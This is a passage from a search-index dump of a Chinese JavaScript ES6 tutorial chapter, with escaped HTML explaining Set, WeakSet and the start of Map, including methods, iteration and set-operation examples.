<p>\u4e0a\u9762\u7684\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u7528\u4e8e\uff0c\u53bb\u9664\u5b57\u7b26\u4e32\u91cc\u9762\u7684\u91cd\u590d\u5b57\u7b26\u3002</p> <pre><code>[...new Set('ababbc')].join('')\n// \"abc\"\n[...newSet('fghjklfghjk')].join('');\n</code></pre> <p>\u5411 Set \u52a0\u5165\u503c\u7684\u65f6\u5019\uff0c\u4e0d\u4f1a\u53d1\u751f\u7c7b\u578b\u8f6c\u6362\uff0c\u6240\u4ee5<code>5</code>\u548c<code>\"5\"</code>\u662f\u4e24\u4e2a\u4e0d\u540c\u7684\u503c\u3002Set \u5185\u90e8\u5224\u65ad\u4e24\u4e2a\u503c\u662f\u5426\u4e0d\u540c\uff0c\u4f7f\u7528\u7684\u7b97\u6cd5\u53eb\u505a\u201cSame-value-zero equality\u201d\uff0c\u5b83\u7c7b\u4f3c\u4e8e\u7cbe\u786e\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08<code>===</code>\uff09\uff0c\u4e3b\u8981\u7684\u533a\u522b\u662f\u5411 Set \u52a0\u5165\u503c\u65f6\u8ba4\u4e3a<code>NaN</code>\u7b49\u4e8e\u81ea\u8eab\uff0c\u800c\u7cbe\u786e\u76f8\u7b49\u8fd0\u7b97\u7b26\u8ba4\u4e3a<code>NaN</code>\u4e0d\u7b49\u4e8e\u81ea\u8eab\u3002</p> <pre><code>let set = new Set();\nlet a = NaN;\nlet b = NaN;\nset.add(a);\nset.add(b);\nset // Set {NaN}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5411 Set \u5b9e\u4f8b\u6dfb\u52a0\u4e86\u4e24\u4e2a<code>NaN</code>\uff0c\u4f46\u662f\u53ea\u80fd\u52a0\u5165\u4e00\u4e2a\u3002\u8fd9\u8868\u660e\uff0c\u5728 Set \u5185\u90e8\uff0c\u4e24\u4e2a<code>NaN</code>\u662f\u76f8\u7b49\u3002</p> <p>\u53e6\u5916\uff0c\u4e24\u4e2a\u5bf9\u8c61\u603b\u662f\u4e0d\u76f8\u7b49\u7684\u3002</p> <pre><code>let set = new Set();\n\nset.add({});\nset.size // 1\n\nset.add({});\nset.size // 2\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u7531\u4e8e\u4e24\u4e2a\u7a7a\u5bf9\u8c61\u4e0d\u76f8\u7b49\uff0c\u6240\u4ee5\u5b83\u4eec\u88ab\u89c6\u4e3a\u4e24\u4e2a\u503c\u3002</p>"},{"location":"ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_2","title":"\u5c5e\u6027","text":"<p>Set \u7ed3\u6784\u7684\u5b9e\u4f8b\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002</p> <ul> <li><code>Set.prototype.constructor</code>\uff1a\u6784\u9020\u51fd\u6570\uff0c\u9ed8\u8ba4\u5c31\u662f<code>Set</code>\u51fd\u6570\u3002</li> <li><code>Set.prototype.size</code>\uff1a\u8fd4\u56de<code>Set</code>\u5b9e\u4f8b\u7684\u6210\u5458\u603b\u6570\u3002</li> </ul> <p>Set \u5b9e\u4f8b\u7684\u65b9\u6cd5\u5206\u4e3a\u4e24\u5927\u7c7b\uff1a\u64cd\u4f5c\u65b9\u6cd5\uff08\u7528\u4e8e\u64cd\u4f5c\u6570\u636e\uff09\u548c\u904d\u5386\u65b9\u6cd5\uff08\u7528\u4e8e\u904d\u5386\u6210\u5458\uff09\u3002</p>"},{"location":"ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_3","title":"\u64cd\u4f5c\u65b9\u6cd5","text":"<ul> <li><code>Set.prototype.add(value)</code>\uff1a\u6dfb\u52a0\u67d0\u4e2a\u503c\uff0c\u8fd4\u56de Set \u7ed3\u6784\u672c\u8eab\u3002</li> <li><code>Set.prototype.delete(value)</code>\uff1a\u5220\u9664\u67d0\u4e2a\u503c\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5220\u9664\u662f\u5426\u6210\u529f\u3002</li> <li><code>Set.prototype.has(value)</code>\uff1a\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u503c\u662f\u5426\u4e3a<code>Set</code>\u7684\u6210\u5458\u3002</li> <li><code>Set.prototype.clear()</code>\uff1a\u6e05\u9664\u6240\u6709\u6210\u5458\uff0c\u6ca1\u6709\u8fd4\u56de\u503c\u3002</li> </ul> <p>\u4e0a\u9762\u8fd9\u4e9b\u5c5e\u6027\u548c\u65b9\u6cd5\u7684\u5b9e\u4f8b\u5982\u4e0b\u3002</p> <pre><code>s.add(1).add(2).add(2);\n// \u6ce8\u610f2\u88ab\u52a0\u5165\u4e86\u4e24\u6b21\n\ns.size // 2\n\ns.has(1) // true\ns.has(2) // true\ns.has(3) // false\n\ns.delete(2);\ns.has(2) // false\n</code></pre> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u5bf9\u6bd4\uff0c\u770b\u770b\u5728\u5224\u65ad\u662f\u5426\u5305\u62ec\u4e00\u4e2a\u952e\u4e0a\u9762\uff0c<code>Object</code>\u7ed3\u6784\u548c<code>Set</code>\u7ed3\u6784\u7684\u5199\u6cd5\u4e0d\u540c\u3002</p> <pre><code>// \u5bf9\u8c61\u7684\u5199\u6cd5\nconst properties = {\n  'width': 1,\n  'height': 1\n};\n\nif (properties[someName]) {\n  // do something\n}\n\n// Set\u7684\u5199\u6cd5\nconst properties = new Set();\n\nproperties.add('width');\nproperties.add('height');\n\nif (properties.has(someName)) {\n  // do something\n}\n</code></pre> <p><code>Array.from</code>\u65b9\u6cd5\u53ef\u4ee5\u5c06 Set \u7ed3\u6784\u8f6c\u4e3a\u6570\u7ec4\u3002</p> <pre><code>const items = new Set([1, 2, 3, 4, 5]);\nconst array = Array.from(items);\n</code></pre> <p>\u8fd9\u5c31\u63d0\u4f9b\u4e86==\u53bb\u9664\u6570\u7ec4\u91cd\u590d\u6210\u5458\u7684\u53e6\u4e00\u79cd\u65b9\u6cd5==\u3002</p> <pre><code>function dedupe(array) {\n  return Array.from(new Set(array));\n}\n\ndedupe([1, 1, 2, 3]) // [1, 2, 3]\n</code></pre>"},{"location":"ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_4","title":"\u904d\u5386\u64cd\u4f5c","text":"<p>Set \u7ed3\u6784\u7684\u5b9e\u4f8b\u6709\u56db\u4e2a\u904d\u5386\u65b9\u6cd5\uff0c\u53ef\u4ee5\u7528\u4e8e\u904d\u5386\u6210\u5458\u3002</p> <ul> <li><code>Set.prototype.keys()</code>\uff1a\u8fd4\u56de\u952e\u540d\u7684\u904d\u5386\u5668</li> <li><code>Set.prototype.values()</code>\uff1a\u8fd4\u56de\u952e\u503c\u7684\u904d\u5386\u5668</li> <li><code>Set.prototype.entries()</code>\uff1a\u8fd4\u56de\u952e\u503c\u5bf9\u7684\u904d\u5386\u5668</li> <li><code>Set.prototype.forEach()</code>\uff1a\u4f7f\u7528\u56de\u8c03\u51fd\u6570\u904d\u5386\u6bcf\u4e2a\u6210\u5458</li> </ul> <p>\u9700\u8981\u7279\u522b\u6307\u51fa\u7684\u662f\uff0c<code>Set</code>\u7684\u904d\u5386\u987a\u5e8f\u5c31\u662f\u63d2\u5165\u987a\u5e8f\u3002\u8fd9\u4e2a\u7279\u6027\u6709\u65f6\u975e\u5e38\u6709\u7528\uff0c\u6bd4\u5982\u4f7f\u7528 Set \u4fdd\u5b58\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u5217\u8868\uff0c\u8c03\u7528\u65f6\u5c31\u80fd\u4fdd\u8bc1\u6309\u7167\u6dfb\u52a0\u987a\u5e8f\u8c03\u7528\u3002</p> <p>\uff081\uff09keys()\uff0cvalues()\uff0centries()</p> <p><code>keys</code>\u65b9\u6cd5\u3001<code>values</code>\u65b9\u6cd5\u3001<code>entries</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u90fd\u662f\u904d\u5386\u5668\u5bf9\u8c61\uff08\u8be6\u89c1\u300aIterator \u5bf9\u8c61\u300b\u4e00\u7ae0\uff09\u3002\u7531\u4e8e Set \u7ed3\u6784\u6ca1\u6709\u952e\u540d\uff0c\u53ea\u6709\u952e\u503c\uff08\u6216\u8005\u8bf4\u952e\u540d\u548c\u952e\u503c\u662f\u540c\u4e00\u4e2a\u503c\uff09\uff0c\u6240\u4ee5<code>keys</code>\u65b9\u6cd5\u548c<code>values</code>\u65b9\u6cd5\u7684\u884c\u4e3a\u5b8c\u5168\u4e00\u81f4\u3002</p> <pre><code>let set = new Set(['red', 'green', 'blue']);\n\nfor (let item of set.keys()) {\n  console.log(item);\n}\n// red\n// green\n// blue\n\nfor (let item of set.values()) {\n  console.log(item);\n}\n// red\n// green\n// blue\n\nfor (let item of set.entries()) {\n  console.log(item);\n}\n// [\"red\", \"red\"]\n// [\"green\", \"green\"]\n// [\"blue\", \"blue\"]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>entries</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u904d\u5386\u5668\uff0c\u540c\u65f6\u5305\u62ec\u952e\u540d\u548c\u952e\u503c\uff0c\u6240\u4ee5\u6bcf\u6b21\u8f93\u51fa\u4e00\u4e2a\u6570\u7ec4\uff0c\u5b83\u7684\u4e24\u4e2a\u6210\u5458\u5b8c\u5168\u76f8\u7b49\u3002</p> <p>Set \u7ed3\u6784\u7684\u5b9e\u4f8b\u9ed8\u8ba4\u53ef\u904d\u5386\uff0c\u5b83\u7684\u9ed8\u8ba4\u904d\u5386\u5668\u751f\u6210\u51fd\u6570\u5c31\u662f\u5b83\u7684<code>values</code>\u65b9\u6cd5\u3002</p> <pre><code>Set.prototype[Symbol.iterator] === Set.prototype.values\n// true\n</code></pre> <p>\u8fd9\u610f\u5473\u7740\uff0c\u53ef\u4ee5\u7701\u7565<code>values</code>\u65b9\u6cd5\uff0c\u76f4\u63a5\u7528<code>for...of</code>\u5faa\u73af\u904d\u5386 Set\u3002</p> <pre><code>let set = new Set(['red', 'green', 'blue']);\nfor (let x of set) {\n  console.log(x);\n}\n</code></pre> <p>\uff082\uff09forEach()</p> <p>Set \u7ed3\u6784\u7684\u5b9e\u4f8b\u4e0e\u6570\u7ec4\u4e00\u6837\uff0c\u4e5f\u62e5\u6709<code>forEach</code>\u65b9\u6cd5\uff0c\u7528\u4e8e\u5bf9\u6bcf\u4e2a\u6210\u5458\u6267\u884c\u67d0\u79cd\u64cd\u4f5c\uff0c\u6ca1\u6709\u8fd4\u56de\u503c\u3002</p> <pre><code>let set = new Set([1, 4, 9]);\nset.forEach((value, key) =&gt; console.log(key + ' : ' + value))\n// 1 : 1\n// 4 : 4\n// 9 : 9\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8bf4\u660e\uff0c<code>forEach</code>\u65b9\u6cd5\u7684\u53c2\u6570\u5c31\u662f\u4e00\u4e2a\u5904\u7406\u51fd\u6570\u3002\u8be5\u51fd\u6570\u7684\u53c2\u6570\u4e0e\u6570\u7ec4\u7684<code>forEach</code>\u4e00\u81f4\uff0c\u4f9d\u6b21\u4e3a\u952e\u503c\u3001\u952e\u540d\u3001\u96c6\u5408\u672c\u8eab\uff08\u4e0a\u4f8b\u7701\u7565\u4e86\u8be5\u53c2\u6570\uff09\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\uff0cSet \u7ed3\u6784\u7684\u952e\u540d\u5c31\u662f\u952e\u503c\uff08\u4e24\u8005\u662f\u540c\u4e00\u4e2a\u503c\uff09\uff0c\u56e0\u6b64\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e0e\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u503c\u6c38\u8fdc\u90fd\u662f\u4e00\u6837\u7684\u3002</p> <p>\u53e6\u5916\uff0c<code>forEach</code>\u65b9\u6cd5\u8fd8\u53ef\u4ee5\u6709\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u7ed1\u5b9a\u5904\u7406\u51fd\u6570\u5185\u90e8\u7684<code>this</code>\u5bf9\u8c61\u3002</p> <p>\uff083\uff09\u904d\u5386\u7684\u5e94\u7528</p> <p>\u6269\u5c55\u8fd0\u7b97\u7b26\uff08<code>...</code>\uff09\u5185\u90e8\u4f7f\u7528<code>for...of</code>\u5faa\u73af\uff0c\u6240\u4ee5\u4e5f\u53ef\u4ee5\u7528\u4e8e Set \u7ed3\u6784\u3002</p> <pre><code>let set = new Set(['red', 'green', 'blue']);\nlet arr = [...set];\n// ['red', 'green', 'blue']\n</code></pre> <p>\u6269\u5c55\u8fd0\u7b97\u7b26\u548c Set \u7ed3\u6784\u76f8\u7ed3\u5408\uff0c\u5c31\u53ef\u4ee5\u53bb\u9664\u6570\u7ec4\u7684\u91cd\u590d\u6210\u5458\u3002</p> <pre><code>let arr = [3, 5, 2, 2, 5, 5];\nlet unique = [...new Set(arr)];\n// [3, 5, 2]\n</code></pre> <p>\u800c\u4e14\uff0c\u6570\u7ec4\u7684<code>map</code>\u548c<code>filter</code>\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u95f4\u63a5\u7528\u4e8e Set \u4e86\u3002</p> <pre><code>let set = new Set([1, 2, 3]);\nset = new Set([...set].map(x =&gt; x * 2));\n// \u8fd4\u56deSet\u7ed3\u6784\uff1a{2, 4, 6}\n\nlet set = new Set([1, 2, 3, 4, 5]);\nset = new Set([...set].filter(x =&gt; (x % 2) == 0));\n// \u8fd4\u56deSet\u7ed3\u6784\uff1a{2, 4}\n</code></pre> <p>\u56e0\u6b64==\u4f7f\u7528 Set \u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u5b9e\u73b0\u5e76\u96c6\uff08Union\uff09\u3001\u4ea4\u96c6\uff08Intersect\uff09\u548c\u5dee\u96c6\uff08Difference\uff09==\u3002</p> <pre><code>let a = new Set([1, 2, 3]);\nlet b = new Set([4, 3, 2]);\n\n// \u5e76\u96c6\nlet union = new Set([...a, ...b]);\n// Set {1, 2, 3, 4}\n\n// \u4ea4\u96c6\nlet intersect = new Set([...a].filter(x =&gt; b.has(x)));\n// set {2, 3}\n\n// \u5dee\u96c6\nlet difference = new Set([...a].filter(x =&gt; !b.has(x)));\n// Set {1}\n</code></pre> <p>\u5982\u679c\u60f3\u5728\u904d\u5386\u64cd\u4f5c\u4e2d\uff0c\u540c\u6b65\u6539\u53d8\u539f\u6765\u7684 Set \u7ed3\u6784\uff0c\u76ee\u524d\u6ca1\u6709\u76f4\u63a5\u7684\u65b9\u6cd5\uff0c\u4f46\u6709\u4e24\u79cd\u53d8\u901a\u65b9\u6cd5\u3002\u4e00\u79cd\u662f\u5229\u7528\u539f Set \u7ed3\u6784\u6620\u5c04\u51fa\u4e00\u4e2a\u65b0\u7684\u7ed3\u6784\uff0c\u7136\u540e\u8d4b\u503c\u7ed9\u539f\u6765\u7684 Set \u7ed3\u6784\uff1b\u53e6\u4e00\u79cd\u662f\u5229\u7528<code>Array.from</code>\u65b9\u6cd5\u3002</p> <pre><code>// \u65b9\u6cd5\u4e00\nlet set = new Set([1, 2, 3]);\nset = new Set([...set].map(val =&gt; val * 2));\n// set\u7684\u503c\u662f2, 4, 6\n\n// \u65b9\u6cd5\u4e8c\nlet set = new Set([1, 2, 3]);\nset = new Set(Array.from(set, val =&gt; val * 2));\n// set\u7684\u503c\u662f2, 4, 6\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u63d0\u4f9b\u4e86\u4e24\u79cd\u65b9\u6cd5\uff0c\u76f4\u63a5\u5728\u904d\u5386\u64cd\u4f5c\u4e2d\u6539\u53d8\u539f\u6765\u7684 Set \u7ed3\u6784\u3002</p>"},{"location":"ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#weakset","title":"WeakSet","text":""},{"location":"ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_5","title":"\u542b\u4e49","text":"<p>WeakSet \u7ed3\u6784\u4e0e Set \u7c7b\u4f3c\uff0c\u4e5f\u662f\u4e0d\u91cd\u590d\u7684\u503c\u7684\u96c6\u5408\u3002\u4f46\u662f\uff0c\u5b83\u4e0e Set \u6709\u4e24\u4e2a\u533a\u522b\u3002</p> <p>\u9996\u5148\uff0cWeakSet \u7684\u6210\u5458\u53ea\u80fd\u662f\u5bf9\u8c61\uff0c\u800c\u4e0d\u80fd\u662f\u5176\u4ed6\u7c7b\u578b\u7684\u503c\u3002</p> <pre><code>const ws = new WeakSet();\nws.add(1)\n// TypeError: Invalid value used in weak set\nws.add(Symbol())\n// TypeError: invalid value used in weak set\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8bd5\u56fe\u5411 WeakSet \u6dfb\u52a0\u4e00\u4e2a\u6570\u503c\u548c<code>Symbol</code>\u503c\uff0c\u7ed3\u679c\u62a5\u9519\uff0c\u56e0\u4e3a WeakSet \u53ea\u80fd\u653e\u7f6e\u5bf9\u8c61\u3002</p> <p>\u5176\u6b21\uff0cWeakSet \u4e2d\u7684\u5bf9\u8c61\u90fd\u662f\u5f31\u5f15\u7528\uff0c\u5373\u5783\u573e\u56de\u6536\u673a\u5236\u4e0d\u8003\u8651 WeakSet \u5bf9\u8be5\u5bf9\u8c61\u7684\u5f15\u7528\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u5176\u4ed6\u5bf9\u8c61\u90fd\u4e0d\u518d\u5f15\u7528\u8be5\u5bf9\u8c61\uff0c\u90a3\u4e48\u5783\u573e\u56de\u6536\u673a\u5236\u4f1a\u81ea\u52a8\u56de\u6536\u8be5\u5bf9\u8c61\u6240\u5360\u7528\u7684\u5185\u5b58\uff0c\u4e0d\u8003\u8651\u8be5\u5bf9\u8c61\u8fd8\u5b58\u5728\u4e8e WeakSet \u4e4b\u4e2d\u3002</p> <p>\u8fd9\u662f\u56e0\u4e3a\u5783\u573e\u56de\u6536\u673a\u5236\u4f9d\u8d56\u5f15\u7528\u8ba1\u6570\uff0c\u5982\u679c\u4e00\u4e2a\u503c\u7684\u5f15\u7528\u6b21\u6570\u4e0d\u4e3a<code>0</code>\uff0c\u5783\u573e\u56de\u6536\u673a\u5236\u5c31\u4e0d\u4f1a\u91ca\u653e\u8fd9\u5757\u5185\u5b58\u3002\u7ed3\u675f\u4f7f\u7528\u8be5\u503c\u4e4b\u540e\uff0c\u6709\u65f6\u4f1a\u5fd8\u8bb0\u53d6\u6d88\u5f15\u7528\uff0c\u5bfc\u81f4\u5185\u5b58\u65e0\u6cd5\u91ca\u653e\uff0c\u8fdb\u800c\u53ef\u80fd\u4f1a\u5f15\u53d1\u5185\u5b58\u6cc4\u6f0f\u3002WeakSet \u91cc\u9762\u7684\u5f15\u7528\uff0c\u90fd\u4e0d\u8ba1\u5165\u5783\u573e\u56de\u6536\u673a\u5236\uff0c\u6240\u4ee5\u5c31\u4e0d\u5b58\u5728\u8fd9\u4e2a\u95ee\u9898\u3002\u56e0\u6b64\uff0cWeakSet \u9002\u5408\u4e34\u65f6\u5b58\u653e\u4e00\u7ec4\u5bf9\u8c61\uff0c\u4ee5\u53ca\u5b58\u653e\u8ddf\u5bf9\u8c61\u7ed1\u5b9a\u7684\u4fe1\u606f\u3002\u53ea\u8981\u8fd9\u4e9b\u5bf9\u8c61\u5728\u5916\u90e8\u6d88\u5931\uff0c\u5b83\u5728 WeakSet \u91cc\u9762\u7684\u5f15\u7528\u5c31\u4f1a\u81ea\u52a8\u6d88\u5931\u3002</p> <p>\u7531\u4e8e\u4e0a\u9762\u8fd9\u4e2a\u7279\u70b9\uff0cWeakSet \u7684\u6210\u5458\u662f\u4e0d\u9002\u5408\u5f15\u7528\u7684\uff0c\u56e0\u4e3a\u5b83\u4f1a\u968f\u65f6\u6d88\u5931\u3002\u53e6\u5916\uff0c\u7531\u4e8e WeakSet \u5185\u90e8\u6709\u591a\u5c11\u4e2a\u6210\u5458\uff0c\u53d6\u51b3\u4e8e\u5783\u573e\u56de\u6536\u673a\u5236\u6709\u6ca1\u6709\u8fd0\u884c\uff0c\u8fd0\u884c\u524d\u540e\u5f88\u53ef\u80fd\u6210\u5458\u4e2a\u6570\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u800c\u5783\u573e\u56de\u6536\u673a\u5236\u4f55\u65f6\u8fd0\u884c\u662f\u4e0d\u53ef\u9884\u6d4b\u7684\uff0c\u56e0\u6b64 ES6 \u89c4\u5b9a WeakSet \u4e0d\u53ef\u904d\u5386\u3002</p> <p>\u8fd9\u4e9b\u7279\u70b9\u540c\u6837\u9002\u7528\u4e8e\u672c\u7ae0\u540e\u9762\u8981\u4ecb\u7ecd\u7684 WeakMap \u7ed3\u6784\u3002</p>"},{"location":"ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_6","title":"\u8bed\u6cd5","text":"<p>WeakSet \u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528<code>new</code>\u547d\u4ee4\uff0c\u521b\u5efa WeakSet \u6570\u636e\u7ed3\u6784\u3002</p> <pre><code>const ws = new WeakSet();\n</code></pre> <p>\u4f5c\u4e3a\u6784\u9020\u51fd\u6570\uff0cWeakSet \u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u6570\u7ec4\u6216\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u3002\uff08\u5b9e\u9645\u4e0a\uff0c\u4efb\u4f55\u5177\u6709 Iterable \u63a5\u53e3\u7684\u5bf9\u8c61\uff0c\u90fd\u53ef\u4ee5\u4f5c\u4e3a WeakSet \u7684\u53c2\u6570\u3002\uff09\u8be5\u6570\u7ec4\u7684\u6240\u6709\u6210\u5458\uff0c\u90fd\u4f1a\u81ea\u52a8\u6210\u4e3a WeakSet \u5b9e\u4f8b\u5bf9\u8c61\u7684\u6210\u5458\u3002</p> <pre><code>const a = [[1, 2], [3, 4]];\nconst ws = new WeakSet(a);\n// WeakSet {[1, 2], [3, 4]}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>a</code>\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u5b83\u6709\u4e24\u4e2a\u6210\u5458\uff0c\u4e5f\u90fd\u662f\u6570\u7ec4\u3002\u5c06<code>a</code>\u4f5c\u4e3a WeakSet \u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\uff0c<code>a</code>\u7684\u6210\u5458\u4f1a\u81ea\u52a8\u6210\u4e3a WeakSet \u7684\u6210\u5458\u3002</p> <p>\u6ce8\u610f\uff0c\u662f<code>a</code>\u6570\u7ec4\u7684\u6210\u5458\u6210\u4e3a WeakSet \u7684\u6210\u5458\uff0c\u800c\u4e0d\u662f<code>a</code>\u6570\u7ec4\u672c\u8eab\u3002\u8fd9\u610f\u5473\u7740\uff0c\u6570\u7ec4\u7684\u6210\u5458\u53ea\u80fd\u662f\u5bf9\u8c61\u3002</p> <pre><code>const b = [3, 4];\nconst ws = new WeakSet(b);\n// Uncaught TypeError: Invalid value used in weak set(\u2026)\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4<code>b</code>\u7684\u6210\u5458\u4e0d\u662f\u5bf9\u8c61\uff0c\u52a0\u5165 WeaKSet \u5c31\u4f1a\u62a5\u9519\u3002</p> <p>WeakSet \u7ed3\u6784\u6709\u4ee5\u4e0b\u4e09\u4e2a\u65b9\u6cd5\u3002</p> <ul> <li>WeakSet.prototype.add(value)\uff1a\u5411 WeakSet \u5b9e\u4f8b\u6dfb\u52a0\u4e00\u4e2a\u65b0\u6210\u5458\u3002</li> <li>WeakSet.prototype.delete(value)\uff1a\u6e05\u9664 WeakSet \u5b9e\u4f8b\u7684\u6307\u5b9a\u6210\u5458\u3002</li> <li>WeakSet.prototype.has(value)\uff1a\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u67d0\u4e2a\u503c\u662f\u5426\u5728 WeakSet \u5b9e\u4f8b\u4e4b\u4e2d\u3002</li> </ul> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>const ws = new WeakSet();\nconst obj = {};\nconst foo = {};\n\nws.add(window);\nws.add(obj);\n\nws.has(window); // true\nws.has(foo);    // false\n\nws.delete(window);\nws.has(window);    // false\n</code></pre> <p>WeakSet \u6ca1\u6709<code>size</code>\u5c5e\u6027\uff0c\u6ca1\u6709\u529e\u6cd5\u904d\u5386\u5b83\u7684\u6210\u5458\u3002</p> <pre><code>ws.size // undefined\nws.forEach // undefined\n\nws.forEach(function(item){ console.log('WeakSet has ' + item)})\n// TypeError: undefined is not a function\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8bd5\u56fe\u83b7\u53d6<code>size</code>\u548c<code>forEach</code>\u5c5e\u6027\uff0c\u7ed3\u679c\u90fd\u4e0d\u80fd\u6210\u529f\u3002</p> <p>WeakSet \u4e0d\u80fd\u904d\u5386\uff0c\u662f\u56e0\u4e3a\u6210\u5458\u90fd\u662f\u5f31\u5f15\u7528\uff0c\u968f\u65f6\u53ef\u80fd\u6d88\u5931\uff0c\u904d\u5386\u673a\u5236\u65e0\u6cd5\u4fdd\u8bc1\u6210\u5458\u7684\u5b58\u5728\uff0c\u5f88\u53ef\u80fd\u521a\u521a\u904d\u5386\u7ed3\u675f\uff0c\u6210\u5458\u5c31\u53d6\u4e0d\u5230\u4e86\u3002WeakSet \u7684\u4e00\u4e2a\u7528\u5904\uff0c\u662f\u50a8\u5b58 DOM \u8282\u70b9\uff0c\u800c\u4e0d\u7528\u62c5\u5fc3\u8fd9\u4e9b\u8282\u70b9\u4ece\u6587\u6863\u79fb\u9664\u65f6\uff0c\u4f1a\u5f15\u53d1\u5185\u5b58\u6cc4\u6f0f\u3002</p> <p>\u4e0b\u9762\u662f WeakSet \u7684\u53e6\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>const foos = new WeakSet()\nclass Foo {\n  constructor() {\n    foos.add(this)\n  }\n  method () {\n    if (!foos.has(this)) {\n      throw new TypeError('Foo.prototype.method \u53ea\u80fd\u5728Foo\u7684\u5b9e\u4f8b\u4e0a\u8c03\u7528\uff01');\n    }\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4fdd\u8bc1\u4e86<code>Foo</code>\u7684\u5b9e\u4f8b\u65b9\u6cd5\uff0c\u53ea\u80fd\u5728<code>Foo</code>\u7684\u5b9e\u4f8b\u4e0a\u8c03\u7528\u3002\u8fd9\u91cc\u4f7f\u7528 WeakSet \u7684\u597d\u5904\u662f\uff0c<code>foos</code>\u5bf9\u5b9e\u4f8b\u7684\u5f15\u7528\uff0c\u4e0d\u4f1a\u88ab\u8ba1\u5165\u5185\u5b58\u56de\u6536\u673a\u5236\uff0c\u6240\u4ee5\u5220\u9664\u5b9e\u4f8b\u7684\u65f6\u5019\uff0c\u4e0d\u7528\u8003\u8651<code>foos</code>\uff0c\u4e5f\u4e0d\u4f1a\u51fa\u73b0\u5185\u5b58\u6cc4\u6f0f\u3002</p>"},{"location":"ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#map","title":"Map","text":""},{"location":"ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_7","title":"\u57fa\u672c\u7528\u6cd5","text":"<p>JavaScript \u7684\u5bf9\u8c61\uff08Object\uff09\uff0c\u672c\u8d28\u4e0a\u662f\u952e\u503c\u5bf9\u7684\u96c6\u5408\uff08Hash \u7ed3\u6784\uff09\uff0c\u4f46\u662f\u4f20\u7edf\u4e0a\u53ea\u80fd\u7528\u5b57\u7b26\u4e32\u5f53\u4f5c\u952e\u3002\u8fd9\u7ed9\u5b83\u7684\u4f7f\u7528\u5e26\u6765\u4e86\u5f88\u5927\u7684\u9650\u5236\u3002</p> <pre><code>const data = {};\nconst element = document.getElementById('myDiv');\n\ndata[element] = 'metadata';\ndata['[object HTMLDivElement]'] // \"metadata\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u539f\u610f\u662f\u5c06\u4e00\u4e2a DOM \u8282\u70b9\u4f5c\u4e3a\u5bf9\u8c61<code>data</code>\u7684\u952e\uff0c\u4f46\u662f\u7531\u4e8e\u5bf9\u8c61\u53ea\u63a5\u53d7\u5b57\u7b26\u4e32\u4f5c\u4e3a\u952e\u540d\uff0c\u6240\u4ee5<code>element</code>\u88ab\u81ea\u52a8\u8f6c\u4e3a\u5b57\u7b26\u4e32<code>[object HTMLDivElement]</code>\u3002</p> <p>\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0cES6 \u63d0\u4f9b\u4e86 Map 